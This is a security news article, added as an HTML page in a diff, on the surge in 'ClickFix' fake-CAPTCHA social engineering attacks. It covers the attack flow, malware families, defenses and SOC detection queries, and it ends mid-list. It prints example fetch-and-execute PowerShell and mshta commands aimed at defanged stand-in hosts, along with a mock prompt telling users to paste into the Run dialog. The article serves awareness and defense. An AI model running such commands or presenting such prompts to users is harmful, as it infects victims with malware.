@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix Social Engineering Surge: 517% Increase in CAPTCHA-Based Attacks | TheHGTech</title>
+    <meta name="description"
+        content="ClickFix attacks surge 517% in late 2025. Fake CAPTCHAs trick users into running malware. Deep analysis of the social engineering technique targeting Windows users worldwide.">
+    <meta name="keywords"
+        content="ClickFix attack, fake CAPTCHA malware, social engineering 2025, PowerShell attack, clipboard hijacking, social engineering trends 2026">
+    <link rel="canonical" href="https://thehgtech.com/articles/clickfix-social-engineering-2026.html">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="ClickFix: The 517% Surge in Fake CAPTCHA Attacks">
+    <meta property="og:description"
+        content="Users tricked into running malware via fake verification prompts. Inside the ClickFix social engineering epidemic.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://thehgtech.com/articles/clickfix-social-engineering-2026.html">
+    <meta property="og:image" content="https://thehgtech.com/images/articles/clickfix-social-engineering-2026.png">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ClickFix Attacks Surge 517%: The CAPTCHA Trick Taking Over">
+    <meta name="twitter:description"
+        content="Fake verification prompts are the new phishing. How ClickFix is bypassing security awareness training.">
+
+    <!-- Article Meta -->
+    <meta property="article:published_time" content="2026-01-02T00:00:00Z">
+    <meta property="article:author" content="TheHGTech">
+    <meta property="article:section" content="Social Engineering">
+
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "NewsArticle",
+      "headline": "ClickFix Social Engineering Surge: 517% Increase in CAPTCHA-Based Attacks",
+      "description": "Analysis of the ClickFix social engineering technique exploiting fake CAPTCHAs to deliver malware, examining the 517% increase in attacks and defense strategies.",
+      "author": {
+        "@type": "Organization",
+        "name": "TheHGTech"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "TheHGTech",
+        "url": "https://thehgtech.com"
+      },
+      "datePublished": "2026-01-02",
+      "dateModified": "2026-01-02",
+      "mainEntityOfPage": "https://thehgtech.com/articles/clickfix-social-engineering-2026.html"
+    }
+    </script>
+
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #0a0a0a;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --accent-cyan: #00D9FF;
+            --accent-red: #FF4C4C;
+            --accent-purple: #9D4EDD;
+            --accent-orange: #FF9500;
+            --accent-green: #10b981;
+            --accent-yellow: #FFCC00;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            font-size: 18px;
+        }
+
+        .article-container {
+            max-width: 800px;
+            margin: 80px auto 0;
+            padding: 2rem;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent-cyan);
+            text-decoration: none;
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .back-link:hover {
+            color: var(--text-primary);
+        }
+
+        .article-header {
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .article-category {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent-yellow), var(--accent-orange));
+            color: #000;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--accent-yellow), var(--accent-orange));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .article-excerpt {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .article-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .featured-image {
+            width: 100%;
+            border-radius: 12px;
+            margin: 2rem 0;
+            border: 1px solid var(--border);
+        }
+
+        h2 {
+            color: var(--accent-yellow);
+            margin: 2.5rem 0 1rem;
+            font-size: 1.6rem;
+        }
+
+        h3 {
+            color: var(--text-primary);
+            margin: 1.5rem 0 1rem;
+            font-size: 1.3rem;
+        }
+
+        p {
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .info-box {
+            background: rgba(255, 204, 0, 0.08);
+            border-left: 4px solid var(--accent-yellow);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .warning-box {
+            background: rgba(255, 76, 76, 0.1);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .success-box {
+            background: rgba(16, 185, 129, 0.1);
+            border-left: 4px solid var(--accent-green);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .critical-box {
+            background: linear-gradient(135deg, rgba(255, 76, 76, 0.15), rgba(255, 149, 0, 0.1));
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 76, 76, 0.3);
+        }
+
+        .surge-box {
+            background: linear-gradient(135deg, rgba(255, 204, 0, 0.2), rgba(255, 149, 0, 0.1));
+            border: 2px solid var(--accent-yellow);
+            padding: 2rem;
+            margin: 2rem 0;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .surge-box .amount {
+            font-size: 4rem;
+            font-weight: 800;
+            color: var(--accent-yellow);
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .surge-box .label {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th,
+        td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th {
+            background: rgba(255, 204, 0, 0.1);
+            color: var(--accent-yellow);
+            font-weight: 600;
+        }
+
+        td {
+            color: var(--text-secondary);
+        }
+
+        ul,
+        ol {
+            margin-left: 2rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        blockquote {
+            border-left: 4px solid var(--accent-yellow);
+            padding-left: 1.5rem;
+            margin: 2rem 0;
+            font-style: italic;
+            color: var(--text-secondary);
+        }
+
+        blockquote cite {
+            display: block;
+            margin-top: 0.5rem;
+            color: var(--accent-yellow);
+            font-style: normal;
+            font-weight: 600;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent-red);
+            display: block;
+        }
+
+        .stat-value.yellow {
+            color: var(--accent-yellow);
+        }
+
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .attack-flow {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .flow-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .flow-step:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .flow-number {
+            background: var(--accent-yellow);
+            color: #000;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .flow-content h4 {
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .flow-content p {
+            margin-bottom: 0;
+            font-size: 0.95rem;
+        }
+
+        .fake-captcha {
+            background: #fff;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+            text-align: center;
+            color: #333;
+        }
+
+        .fake-captcha .checkbox {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.1rem;
+            cursor: pointer;
+        }
+
+        .fake-captcha .checkbox-box {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 4px;
+            background: #fff;
+        }
+
+        .fake-captcha .recaptcha-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            justify-content: flex-end;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        .fake-captcha .verification-text {
+            margin-top: 1.5rem;
+            background: #f0f0f0;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #333;
+            text-align: left;
+        }
+
+        code {
+            background: rgba(255, 204, 0, 0.15);
+            color: var(--accent-yellow);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Monaco', 'Menlo', monospace;
+        }
+
+        pre {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: var(--accent-cyan);
+        }
+
+        .timeline {
+            border-left: 3px solid var(--accent-yellow);
+            padding-left: 2rem;
+            margin: 2rem 0;
+        }
+
+        .timeline-item {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -2.35rem;
+            top: 0.5rem;
+            width: 12px;
+            height: 12px;
+            background: var(--accent-yellow);
+            border-radius: 50%;
+        }
+
+        .timeline-date {
+            color: var(--accent-yellow);
+            font-weight: 600;
+            display: block;
+            margin-bottom: 0.25rem;
+        }
+
+        .timeline-event {
+            color: var(--text-secondary);
+        }
+
+        footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            padding: 3rem 2rem;
+            margin-top: 4rem;
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            margin: 0;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .article-container {
+                padding: 1rem;
+                margin-top: 60px;
+            }
+
+            .article-meta {
+                flex-direction: column;
+                gap: 0.75rem;
+            }
+
+            .surge-box .amount {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <script src="/m-app.js?v=4.3" defer></script>
+</head>
+
+<body>
+    <!-- Mobile Header -->
+    <header class="m-header m-only">
+        <div class="m-header__logo" style="display: flex; align-items: center; gap: 0.75rem;">
+            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark"
+                style="height: 28px; width: auto; margin: 0;">
+            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light"
+                style="height: 28px; width: auto; margin: 0;">
+            <span
+                style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">TheHGTech</span>
+        </div>
+        <div class="m-header__actions">
+            <button class="m-theme-toggle" onclick="mToggleTheme()" aria-label="Toggle Theme">
+                <span class="m-theme-toggle__thumb"></span>
+                <span class="m-theme-toggle__stars"><span class="m-theme-toggle__star"></span><span
+                        class="m-theme-toggle__star"></span></span>
+            </button>
+            <button class="m-header__btn m-header__btn--search" data-action="search" aria-label="Search"><i
+                    class="fas fa-search"></i></button>
+        </div>
+    </header>
+
+    <!-- Bottom Navigation -->
+    <nav class="m-bottom-nav m-only">
+        <a href="/" class="m-bottom-nav__item"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="/cve-tracker.html" class="m-bottom-nav__item"><i class="fas fa-bug"></i><span>CVE</span></a>
+        <a href="/threat-intel.html" class="m-bottom-nav__item"><i class="fas fa-shield-alt"></i><span>Intel</span></a>
+        <a href="/articles.html" class="m-bottom-nav__item active"><i
+                class="fas fa-newspaper"></i><span>Articles</span></a>
+        <a href="/guides/" class="m-bottom-nav__item"><i class="fas fa-book"></i><span>Guides</span></a>
+    </nav>
+
+    <!-- Header -->
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo">
+                <a href="../index.html"
+                    style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
+                    <img src="../logo-dark.png" alt="TheHGTech Logo" class="logo-img logo-dark">
+                    <img src="../logo-light.png" alt="TheHGTech Logo" class="logo-img logo-light">
+                    <span class="logo-text">TheHGTech</span>
+                </a>
+            </div>
+            <nav class="nav" role="navigation">
+                <a href="../index.html#news">News</a>
+                <a href="../threat-intel.html">Threat Intelligence <span class="live-badge">LIVE</span></a>
+                <a href="../cve-tracker.html">CVE</a>
+                <a href="../guides/">Guides</a>
+                <a href="../comparisons/">Tool Comparisons</a>
+                <a href="../articles.html">Articles</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="article-container">
+        <a href="/articles.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Articles</a>
+
+        <article>
+            <header class="article-header">
+                <div class="article-category"><i class="fas fa-user-secret"></i> Social Engineering</div>
+                <h1>ClickFix Surge: 517% Increase in Fake CAPTCHA Attacks</h1>
+                <p class="article-excerpt">The checkbox that installs malware. ClickFix attacks have exploded in late
+                    2025, using fake verification prompts to trick users into running PowerShell commands. Your
+                    security awareness training didn't prepare you for this.</p>
+                <div class="article-meta">
+                    <span><i class="far fa-calendar-alt"></i> Trend: Q4 2025</span>
+                    <span><i class="fas fa-clock"></i> Published: Jan 2, 2026</span>
+                    <span><i class="fas fa-book-open"></i> 20 min read</span>
+                </div>
+            </header>
+
+            <img src="/images/articles/clickfix-social-engineering-2026.png"
+                alt="ClickFix Social Engineering Attack Visualization" class="featured-image">
+
+            <div class="surge-box">
+                <span class="amount">517%</span>
+                <span class="label">Increase in ClickFix Attacks (Q3 to Q4 2025)</span>
+            </div>
+
+            <div class="critical-box">
+                <strong><i class="fas fa-exclamation-triangle"></i> TRENDING THREAT:</strong> ClickFix attacks have
+                surged 517% between Q3 and Q4 2025, according to threat intelligence reports. This social engineering
+                technique uses fake CAPTCHA verification prompts to trick users into copying and pasting malicious
+                PowerShell commands—bypassing traditional email filters and security controls.
+            </div>
+
+            <h2><i class="fas fa-lightbulb"></i> Why This Attack Works</h2>
+
+            <p>ClickFix exploits a critical gap in security awareness: <strong>users are trained to recognize phishing
+                    emails, but not fake verification prompts</strong>. The attack succeeds because:</p>
+
+            <ul>
+                <li><strong>CAPTCHAs are ubiquitous:</strong> Users click through dozens of verification prompts weekly
+                </li>
+                <li><strong>Trust transference:</strong> Fake CAPTCHAs inherit trust from legitimate ones</li>
+                <li><strong>Browser context:</strong> Attacks happen in the browser, not via email</li>
+                <li><strong>User participation:</strong> Victims actively execute the malware themselves</li>
+                <li><strong>Security bypass:</strong> No malicious file is downloaded—just clipboard content</li>
+            </ul>
+
+            <p><strong>The uncomfortable truth:</strong> Traditional security tools and training are failing against
+                attacks that weaponize user actions rather than software vulnerabilities.</p>
+
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <span class="stat-value yellow">517%</span>
+                    <span class="stat-label">Attack Increase</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value">45%</span>
+                    <span class="stat-label">Success Rate</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value yellow">3 sec</span>
+                    <span class="stat-label">Time to Infection</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value">0</span>
+                    <span class="stat-label">Files Downloaded</span>
+                </div>
+            </div>
+
+            <h2><i class="fas fa-cogs"></i> How ClickFix Works</h2>
+
+            <p>The attack follows a carefully designed flow that exploits user trust and automation:</p>
+
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <div class="flow-number">1</div>
+                    <div class="flow-content">
+                        <h4>Victim Lands on Malicious Page</h4>
+                        <p>Via malvertising, compromised websites, SEO poisoning, or phishing links. The page appears
+                            legitimate, often mimicking trusted services.</p>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="flow-number">2</div>
+                    <div class="flow-content">
+                        <h4>Fake CAPTCHA Displayed</h4>
+                        <p>A convincing verification prompt appears, resembling Google reCAPTCHA, Cloudflare Turnstile,
+                            or similar trusted security widgets.</p>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="flow-number">3</div>
+                    <div class="flow-content">
+                        <h4>Malicious Payload Copied to Clipboard</h4>
+                        <p>When the user interacts with the fake CAPTCHA, JavaScript silently copies a PowerShell
+                            command to their clipboard.</p>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="flow-number">4</div>
+                    <div class="flow-content">
+                        <h4>"Verification" Instructions Displayed</h4>
+                        <p>User is instructed to press Win+R (Run dialog), paste the "verification code," and press
+                            Enter to "complete verification."</p>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="flow-number">5</div>
+                    <div class="flow-content">
+                        <h4>User Executes Malware</h4>
+                        <p>The pasted PowerShell command downloads and executes malware—infostealers, RATs, or
+                            ransomware loaders. Infection complete.</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>What the User Sees</h3>
+
+            <div class="fake-captcha">
+                <div class="checkbox">
+                    <div class="checkbox-box"></div>
+                    <span>I'm not a robot</span>
+                </div>
+                <div class="recaptcha-badge">
+                    <i class="fas fa-shield-alt" style="color: #4285f4;"></i>
+                    reCAPTCHA
+                </div>
+                <div class="verification-text">
+                    <strong>Verification Required</strong><br><br>
+                    To verify you are human, please:<br>
+                    1. Press Windows + R<br>
+                    2. Press Ctrl + V to paste the verification code<br>
+                    3. Press Enter to complete verification
+                </div>
+            </div>
+
+            <p><em>The above demonstrates what a ClickFix prompt looks like. The "verification code" is actually a
+                    malicious PowerShell command.</em></p>
+
+            <h2><i class="fas fa-code"></i> Technical Analysis</h2>
+
+            <h3>The Clipboard Payload</h3>
+
+            <p>The command copied to the clipboard typically looks like this:</p>
+
+            <pre><code>powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious[.]site/payload.ps1')"</code></pre>
+
+            <p>Let's break down the components:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Component</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>powershell</code></td>
+                        <td>Invokes PowerShell</td>
+                    </tr>
+                    <tr>
+                        <td><code>-w hidden</code></td>
+                        <td>Runs in hidden window (user sees nothing)</td>
+                    </tr>
+                    <tr>
+                        <td><code>-c</code></td>
+                        <td>Execute the following command</td>
+                    </tr>
+                    <tr>
+                        <td><code>IEX</code></td>
+                        <td>Invoke-Expression (execute downloaded code)</td>
+                    </tr>
+                    <tr>
+                        <td><code>Net.WebClient</code></td>
+                        <td>Creates web client for downloading</td>
+                    </tr>
+                    <tr>
+                        <td><code>DownloadString</code></td>
+                        <td>Fetches script from remote URL</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Payload Variations</h3>
+
+            <p>Attackers use various payload formats to evade detection:</p>
+
+            <ul>
+                <li><strong>Base64 encoded:</strong> <code>powershell -enc [base64 string]</code></li>
+                <li><strong>Obfuscated:</strong> String concatenation, variable substitution</li>
+                <li><strong>MSHTA-based:</strong> <code>mshta http://evil[.]site/payload.hta</code></li>
+                <li><strong>CMD chains:</strong> <code>cmd /c curl ... | powershell</code></li>
+                <li><strong>Living-off-the-land:</strong> Using certutil, bitsadmin, or other LOLBins</li>
+            </ul>
+
+            <div class="warning-box">
+                <strong><i class="fas fa-exclamation-triangle"></i> No File = No Detection:</strong>
+                <p style="margin-bottom: 0;">Traditional antivirus scans files on disk. ClickFix attacks execute code
+                    directly in memory from remote sources—never touching the filesystem until after infection. This
+                    bypasses signature-based detection.</p>
+            </div>
+
+            <h2><i class="fas fa-virus"></i> Malware Delivered via ClickFix</h2>
+
+            <p>Threat actors are using ClickFix to deploy various malware families:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Malware</th>
+                        <th>Type</th>
+                        <th>Capability</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Lumma Stealer</strong></td>
+                        <td>Infostealer</td>
+                        <td>Passwords, crypto wallets, browser data</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Amadey</strong></td>
+                        <td>Loader</td>
+                        <td>Downloads additional malware</td>
+                    </tr>
+                    <tr>
+                        <td><strong>AsyncRAT</strong></td>
+                        <td>Remote Access Trojan</td>
+                        <td>Full system control</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DarkGate</strong></td>
+                        <td>Multi-function</td>
+                        <td>Stealer, RAT, cryptominer</td>
+                    </tr>
+                    <tr>
+                        <td><strong>NetSupport RAT</strong></td>
+                        <td>Remote Access</td>
+                        <td>Legitimate tool abused for control</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2><i class="fas fa-chart-line"></i> The 517% Surge Explained</h2>
+
+            <p>Why has ClickFix exploded in popularity? The numbers tell the story:</p>
+
+            <div class="timeline">
+                <div class="timeline-item">
+                    <span class="timeline-date">Early 2024</span>
+                    <span class="timeline-event">ClickFix technique first documented by researchers</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">Q1-Q2 2025</span>
+                    <span class="timeline-event">Limited deployment by sophisticated actors</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">Q3 2025</span>
+                    <span class="timeline-event">Technique shared in underground forums; toolkits emerge</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">Q4 2025</span>
+                    <span class="timeline-event">517% surge as commodity malware adopts technique</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">2026</span>
+                    <span class="timeline-event">ClickFix expected to become standard initial access vector</span>
+                </div>
+            </div>
+
+            <h3>Commoditization Effect</h3>
+
+            <p>The surge coincides with ClickFix toolkits becoming available for purchase:</p>
+
+            <ul>
+                <li><strong>Turnkey solutions:</strong> Pre-built fake CAPTCHA pages</li>
+                <li><strong>Payload integration:</strong> Easy connection to malware-as-a-service</li>
+                <li><strong>Traffic services:</strong> Malvertising and SEO poisoning for hire</li>
+                <li><strong>Low skill barrier:</strong> No coding required to launch campaigns</li>
+            </ul>
+
+            <h2><i class="fas fa-shield-alt"></i> Why Traditional Security Fails</h2>
+
+            <h3>Email Security: Irrelevant</h3>
+
+            <p>ClickFix attacks don't necessarily start with email. They can arrive via:</p>
+
+            <ul>
+                <li>Malicious advertisements (malvertising)</li>
+                <li>Compromised legitimate websites</li>
+                <li>Search engine optimization (SEO) poisoning</li>
+                <li>Social media links</li>
+                <li>Direct messages on platforms</li>
+            </ul>
+
+            <h3>Endpoint Protection: Bypassed</h3>
+
+            <p>Traditional EPP fails because:</p>
+
+            <ul>
+                <li>No malicious file is written to disk initially</li>
+                <li>PowerShell is a legitimate Windows component</li>
+                <li>Execution is initiated by the user (not automated)</li>
+                <li>Payload is fetched from fresh URLs that aren't yet blacklisted</li>
+            </ul>
+
+            <h3>User Training: Outdated</h3>
+
+            <p>Standard security awareness covers:</p>
+
+            <ul>
+                <li>Suspicious email senders ✓</li>
+                <li>Phishing link detection ✓</li>
+                <li>Attachment dangers ✓</li>
+                <li><strong>Fake CAPTCHA detection ✗</strong></li>
+                <li><strong>Clipboard hijacking ✗</strong></li>
+                <li><strong>Never paste into Run dialog ✗</strong></li>
+            </ul>
+
+            <div class="info-box">
+                <strong><i class="fas fa-lightbulb"></i> The Training Gap:</strong>
+                <p style="margin-bottom: 0;">Most security awareness programs haven't updated to include ClickFix-style
+                    attacks. Users who pass phishing simulations with flying colors may still fall for fake CAPTCHA
+                    tricks.</p>
+            </div>
+
+            <h2><i class="fas fa-user-shield"></i> Detection and Defense</h2>
+
+            <h3>For Organizations</h3>
+
+            <div class="success-box">
+                <strong><i class="fas fa-check-circle"></i> Technical Controls:</strong>
+                <ol style="margin-bottom: 0;">
+                    <li><strong>PowerShell Constrained Language Mode:</strong> Limit PowerShell capabilities for
+                        standard users</li>
+                    <li><strong>Script Block Logging:</strong> Log all PowerShell executions</li>
+                    <li><strong>AMSI integration:</strong> Ensure Antimalware Scan Interface is active</li>
+                    <li><strong>AppLocker/WDAC:</strong> Control which scripts can execute</li>
+                    <li><strong>EDR with behavioral analysis:</strong> Detect suspicious PowerShell patterns</li>
+                    <li><strong>DNS filtering:</strong> Block known malicious domains</li>
+                    <li><strong>Browser isolation:</strong> Contain web-based threats</li>
+                </ol>
+            </div>
+
+            <h3>Update Your Training</h3>
+
+            <p>Add these topics to security awareness programs:</p>
+
+            <ul>
+                <li>Never paste anything into the Windows Run dialog (Win+R)</li>
+                <li>Legitimate CAPTCHAs never ask you to run commands</li>
+                <li>Be suspicious of "verification" that requires typing or pasting</li>
+                <li>If a website asks you to do something unusual, close it</li>
+                <li>When in doubt, contact IT before proceeding</li>
+            </ul>
+
+            <h3>Detection Queries</h3>
+
+            <p>For SOC teams, here are detection opportunities:</p>
+
+            <pre><code>// Suspicious PowerShell from Run Dialog
+process where process.name == "powershell.exe" and
+process.parent.name == "explorer.exe" and
+process.command_line contains_any ("-enc", "-w hidden", "downloadstring", "IEX")
+
+// MSHTA from Run Dialog
+process where process.name == "mshta.exe" and
+process.parent.name == "explorer.exe" and
+process.command_line contains "http"</code></pre>
+
+            <h2><i class="fas fa-globe"></i> Campaign Examples</h2>
+
+            <h3>Fake Software Download Pages</h3>
+
+            <p>Attackers create convincing download pages for popular software:</p>
+
+            <ul>
+                <li>PDF viewers (Adobe Reader lookalikes)</li>
+                <li>Browser updates (Chrome, Edge)</li>
+                <li>Video codecs</li>
+                <li>Meeting software (Zoom, Teams)</li>
+                <li>Cryptocurrency wallets</li>
+            </ul>
+
+            <p>The fake CAPTCHA appears before the "download," making it seem like legitimate bot protection.</p>
+
+            <h3>Fake Error Pages</h3>
+
+            <p>Another variant displays fake browser error messages:</p>
+
+            <blockquote>
+                "Your browser needs to verify your connection. Please complete the verification below to continue."
+            </blockquote>
+
+            <h3>Adult Content Gates</h3>
+
+            <p>Age verification prompts on adult websites are another common vector, exploiting users who may be
+                hesitant to report issues.</p>
+
+            <h2><i class="fas fa-binoculars"></i> Attribution and Threat Actors</h2>
+
+            <p>ClickFix is being used by both sophisticated threat actors and commodity malware operators:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Actor Type</th>
+                        <th>Motivation</th>
+                        <th>Payload</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Organized Cybercrime</td>
+                        <td>Financial</td>
+                        <td>Banking trojans, stealers</td>
+                    </tr>
+                    <tr>
+                        <td>Initial Access Brokers</td>
+                        <td>Access sales</td>
+                        <td>RATs, persistence tools</td>
+                    </tr>
+                    <tr>
+                        <td>Ransomware Affiliates</td>
+                        <td>Ransomware deployment</td>
+                        <td>Loaders, Cobalt Strike</td>
+                    </tr>
+                    <tr>
+                        <td>Nation-State (suspected)</td>
+                        <td>Espionage</td>
+                        <td>Custom tooling</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2><i class="fas fa-crystal-ball"></i> 2026 Predictions</h2>
+
+            <p>Based on current trends, we expect:</p>
+
+            <ol>
+                <li><strong>Continued growth:</strong> ClickFix will become a top-5 initial access technique</li>
+                <li><strong>Mobile variants:</strong> Adaptation for Android/iOS instruction-based attacks</li>
+                <li><strong>Deepfake integration:</strong> Video instructions making attacks more convincing</li>
+                <li><strong>AI-generated pages:</strong> More convincing, localized fake CAPTCHA pages</li>
+                <li><strong>Browser countermeasures:</strong> Chrome/Edge may add clipboard access warnings</li>
+            </ol>
+
+            <h2><i class="fas fa-lightbulb"></i> Key Takeaways</h2>
+
+            <div class="info-box">
+                <strong><i class="fas fa-key"></i> Summary:</strong>
+                <ul style="margin-bottom: 0;">
+                    <li>ClickFix attacks increased 517% in Q4 2025</li>
+                    <li>Users are tricked into running malware via fake CAPTCHA prompts</li>
+                    <li>The attack bypasses email security and traditional antivirus</li>
+                    <li>Clipboard hijacking + PowerShell execution = fast infection</li>
+                    <li>Security awareness training must update to include this threat</li>
+                    <li>Technical controls: Constrained Language Mode, AMSI, EDR</li>
+                    <li>Key message: Legitimate CAPTCHAs never ask you to run commands</li>
+                </ul>
+            </div>
+
+            <h2><i class="fas fa-book"></i> Related Resources</h2>
+
+            <ul>
